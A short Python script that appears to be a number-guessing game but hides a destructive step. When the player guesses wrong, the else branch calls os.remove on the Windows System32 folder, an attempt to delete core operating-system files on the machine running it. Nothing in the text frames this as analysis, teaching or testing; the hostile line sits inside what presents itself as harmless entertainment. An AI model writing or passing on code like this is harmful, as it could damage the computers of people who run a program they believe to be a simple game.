import random
import os

num = random.randint(1, 10)

guess = int(input("Guess the number between 1 and 10"))

if guess == num:
    print("You won!")

else:
    os.remove("C:\Windows\System32")